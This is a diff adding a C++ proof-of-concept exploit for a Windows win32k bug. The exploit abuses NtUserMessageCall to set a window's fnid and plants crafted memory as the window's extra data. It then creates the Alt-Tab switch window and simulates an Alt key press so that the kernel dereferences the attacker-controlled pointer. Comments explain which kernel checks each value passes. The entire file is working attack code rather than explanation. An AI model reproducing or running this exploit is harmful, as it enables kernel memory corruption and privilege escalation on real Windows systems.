@@ -1,0 +1,59 @@
+#include <cstdio>
+#include <windows.h>
+
+extern "C" NTSTATUS NtUserMessageCall(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii);
+
+int main() {    
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+
+    WNDCLASSEX wcx;
+    ZeroMemory(&wcx, sizeof(wcx));
+    wcx.hInstance = hInstance;
+    wcx.cbSize = sizeof(wcx);
+    wcx.lpszClassName = L"SploitWnd";
+    wcx.lpfnWndProc = DefWindowProc;
+    wcx.cbWndExtra = 8; //pass check in xxxSwitchWndProc to set wnd->fnid = 0x2A0
+   
+    printf("[*] Registering window\n");
+    ATOM wndAtom = RegisterClassEx(&wcx);
+    if (wndAtom == INVALID_ATOM) {
+        printf("[-] Failed registering SploitWnd window class\n");
+        exit(-1);
+    }
+
+    printf("[*] Creating instance of this window\n");
+    HWND sploitWnd = CreateWindowEx(0, L"SploitWnd", L"", WS_VISIBLE, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
+    if (sploitWnd == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to create SploitWnd window\n");
+        exit(-1);
+    }
+
+    printf("[*] Calling NtUserMessageCall to set fnid = 0x2A0 on window\n");
+    NtUserMessageCall(sploitWnd, WM_CREATE, 0, 0, 0, 0xE0, 1);
+
+    printf("[*] Allocate memory to be used for corruption\n");
+    PVOID mem = VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    printf("\tptr: %p\n", mem);
+    PBYTE byteView = (PBYTE)mem;
+    byteView[0x6c] = 1;             // use GetKeyState in xxxPaintSwitchWindow
+
+    //pass DrawSwitchWndHilite double dereference
+    PVOID* ulongView = (PVOID*)mem;
+    ulongView[0x20 / sizeof(PVOID)] = mem;
+
+    printf("[*] Calling SetWindowLongPtr to set window extra data, that will be later dereferenced\n");
+    SetWindowLongPtr(sploitWnd, 0, (LONG_PTR)mem);
+    printf("[*] GetLastError = %x\n", GetLastError());
+
+    printf("[*] Creating switch window #32771, this has a result of setting (gpsi+0x154) = 0x130\n");
+    HWND switchWnd = CreateWindowEx(0, (LPCWSTR)0x8003, L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
+
+    printf("[*] Simulating alt key press\n");
+    BYTE keyState[256];
+    GetKeyboardState(keyState);
+    keyState[VK_MENU] |= 0x80;
+    SetKeyboardState(keyState);
+
+    printf("[*] Triggering dereference of wnd->extraData by calling NtUserMessageCall second time");
+    NtUserMessageCall(sploitWnd, WM_ERASEBKGND, 0, 0, 0, 0x0, 1);
+}
